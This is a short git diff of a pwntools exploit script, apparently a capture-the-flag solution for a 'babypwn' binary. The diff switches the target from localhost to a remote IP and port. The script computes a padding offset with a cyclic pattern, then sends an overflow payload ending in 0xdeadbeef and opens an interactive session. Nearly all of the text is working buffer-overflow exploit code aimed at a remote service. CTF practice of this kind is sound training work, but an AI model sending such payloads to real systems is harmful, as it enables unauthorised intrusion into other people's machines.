@@ -1,6 +1,6 @@
 from pwn import *
 
-LOCAL = True
+LOCAL = False
 
 c = ""
 for i in range(100):
@@ -11,7 +11,7 @@ with open('payload','w') as f:
 padding = c.index(chr(0x54))
 print(padding)
 
-r = remote('localhost', 4200)
+r = process('./babypwn') if LOCAL else remote('35.185.183.51', 4202)
 
 r.sendline(cyclic(padding) + p32(0xdeadbeef))
 r.interactive()
